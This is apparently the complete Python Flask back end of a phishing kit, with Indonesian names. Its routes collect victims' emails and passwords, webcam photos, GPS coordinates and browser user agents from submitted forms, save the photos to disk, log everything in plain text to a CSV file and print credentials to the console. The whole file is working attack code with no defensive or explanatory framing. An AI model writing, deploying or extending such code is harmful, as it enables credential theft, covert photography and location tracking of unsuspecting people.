from flask import Flask, render_template, request
import os, base64, csv
from datetime import datetime

app = Flask(__name__)
CAPTURE_DIR = "captured_images"
LOG_FILE = "log.csv"

os.makedirs(CAPTURE_DIR, exist_ok=True)

# Buat file CSV jika belum ada
if not os.path.exists(LOG_FILE):
    with open(LOG_FILE, "w", newline="") as f:
        writer = csv.writer(f)
        writer.writerow(["waktu", "jenis", "email", "password", "lat", "lon", "ua", "foto"])

@app.route('/')
def index():
    return render_template("index.html")

@app.route('/berhasil_awal', methods=['POST'])
def berhasil_awal():
    data = request.get_json()
    foto_name = save_photo(data["photo"], "awal") if "photo" in data else ""
    waktu = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    lat = data.get("lat", "")
    lon = data.get("lon", "")
    ua = data.get("ua", "")
    tulis_csv(waktu, "awal", "", "", lat, lon, ua, foto_name)
    print(f"[DATA AWAL] {lat}, {lon}, {ua}")
    return "OK"

@app.route('/berhasil', methods=['POST'])
def berhasil():
    photo = request.form.get("photo")
    email = request.form.get("email", "")
    password = request.form.get("password", "")
    lat = request.form.get("lat", "")
    lon = request.form.get("lon", "")
    ua = request.form.get("ua", "")
    foto_name = save_photo(photo, "login") if photo else ""
    waktu = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    tulis_csv(waktu, "login", email, password, lat, lon, ua, foto_name)
    print(f"[DATA LOGIN] {email}, {password}, {lat}, {lon}, {ua}")
    return "OK"

@app.route('/form_laporan')
def form_laporan():
    return render_template("indanout.html")

def save_photo(photo_data, label):
    try:
        header, encoded = photo_data.split(",", 1)
        data = base64.b64decode(encoded)
        filename = f"{label}_{len(os.listdir(CAPTURE_DIR))+1}.jpg"
        path = os.path.join(CAPTURE_DIR, filename)
        with open(path, "wb") as f:
            f.write(data)
        return filename
    except Exception as e:
        print("Gagal simpan foto:", e)
        return ""

def tulis_csv(waktu, jenis, email, password, lat, lon, ua, foto):
    with open(LOG_FILE, "a", newline="") as f:
        writer = csv.writer(f)
        writer.writerow([waktu, jenis, email, password, lat, lon, ua, foto])

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
        
